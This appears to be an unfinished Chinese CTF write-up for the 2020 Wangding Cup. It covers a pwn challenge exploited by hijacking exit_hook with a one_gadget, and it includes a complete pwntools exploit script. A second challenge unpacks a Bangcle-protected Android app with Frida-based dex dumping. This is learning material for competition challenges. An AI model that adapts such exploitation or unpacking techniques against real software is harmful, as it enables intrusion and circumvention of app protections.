---
title: 2020网鼎杯write-up(未完)
date: 2020-05-11 22:57:10
tags: CTF
---
# PWN  
## boom1  
（这个题目，是以前没有做过的类型，很多分析都是靠猜测，师傅们轻喷……）
这个题拿到了一脸懵，八百多行代码把我看傻了，首先分析下  
![](wdb1.png)  
看到这里有很多text、data、stack段，猜测是个编译器  
![](wdb2.png)
然后这里有一堆符号表，都是C语言函数，猜测是个C语言编译器  
![](wdb3.png)
这个地方看上去要让我们输入源码了  
而且在很多判断条件的地方有";"、"{  }"这样的东西，就更加确定是C语言的东西了  
然后我们先试一试，是不是一个C语言编译器，先弄一段C语言代码输进去看看  
![](wdb4.jpg)  
有内味了  
调调看  
![](wdb5.png)
首先可以看到这里有一块很大的内存空间，就是mmap分配的，就是在那个malloc的地方分配出来的，我们的输入就在这个地方  
然后查看栈中的信息  
![](wdb6.png)
发现这么个玩意儿，直接找偏移把它leak了  
![](wdb7.png)
![](wdb8.png)
远程的话就可以根据这个来查libc版本了  
我们知道mmap分配的区域正好在libc那块内存空间的下方，所以我们输入的东西的地址和libc的偏移是固定的   
然后我们直接定义一个指针他会指向mmap那块区域，可以利用这个指针计算出与libc_base的偏移  
然后我们既然都可以定义变量了，那岂不是相当于源码级操作  
我们直接改写指针就能劫持exit_hook为one_gadget了   
exit_hook和malloc_hook差不多，  
详细参考:https://blog.csdn.net/qq_43116977/article/details/105485947   
那我们只需要将_rtld_global结构体中的__rtld_unlock_recursive劫持为one_gadget就行  
因为这个结构体是在libc中的，所以我们只需要一个字节一个字节的改，后三位改成one_gadget就能在执行exit函数时getshell了  
因为我好像环境不太一样了，复现不出getshell的结果来，暂时先贴一个别人的exp，后面等我跑出来了再贴新的代码和截图    
```python  
#!/usr/bin/env python
#coding=utf-8
from pwn import*
from LibcSearcher import *
import sys
context.log_level = 'debug'
context.terminal = ['terminator','-x','sh','-c']
binary = './main' 
local = 1
if local == 1:
    p=process(binary)
else:
    p=remote("182.92.73.10",24573)
elf=ELF(binary)
libc=elf.libc
def exp():
    payload = '''
    char *key;
    char *number;
    char *p;
    int main()
    {
    key = "N0vice";
    number = key - 0x529028;
    key = number + 6229832 - 3848 + 8;
    key[0] = 0;
    key = number + 6229832;
    p = 0xCD0F3 + number;
    key[0] = (p)&0xFF;
    key[1] = (p>>8)&0xFF;
    key[2] = (p>>16)&0xFF;
    printf("%p %p %p",number,p,*(int *)key);
    }'''
    payload = payload.replace('\n','')
    gdb.attach(p)
    p.sendline(payload)
    
    p.interactive()
exp()
```  
# Reverse  
## bang  
这个题是个Android逆向，首先用PKID查壳，发现是梆梆加固  
![](re1.png)
然后搭好安卓模拟器环境，用[FRIDA-DEXDump](https://github.com/hluwa/FRIDA-DEXDump)工具dump出dex来  
首先下载好x86的[server](https://github.com/frida/frida/releases)  
然后将server用adb push到模拟器中的/data/local/tmp/目录下  
接着adb connect 127.0.0.1:62001就可以连接到我的夜神模拟器  
然后adb shell，把server给一个可执行权限并运行  
然后在FRIDA-DEXDump目录下跑main.py脚本，就能dump出一堆dex  
![](re2.png)
大概长这样  
![(re5.png)
然后把这些dex用dex2jar工具转成jar，但是可能会出现这样的情况  
![](re3.jpg)
没有关系，一个一个试就行了  
接着用jd-gui打开，就能看到flag了  
![](re3.png)
```  
注意：模拟器大部分是x86架构，真机是arm架构，  
所以我们调试的时候需要用x86架构的server，如果用的arm在模拟器上跑就会报错  
跑脚本的时候，缺少什么东西直接pip install装上就行  
```  
## joker  




思考：这题做下来，好像感觉并不是很难，但是比赛时候没搞它是因为自己怕了，看到那么大的代码量不敢去分析，其实很佩服那些大佬，看到了新的没接触过过的东西即使可能看不懂也硬着头皮搞，而我却连硬着头皮看的勇气都没有，从思想上就胆怯了。。  
原来每次比赛都能学到东西是大师傅们会把那些题目复现一波，而我一直这么菜原因就是，每次打完了就完事儿了，啥都不管了……  
这几天先不学新知识了，争取把网鼎的时候看了的题目一个一个复现出来  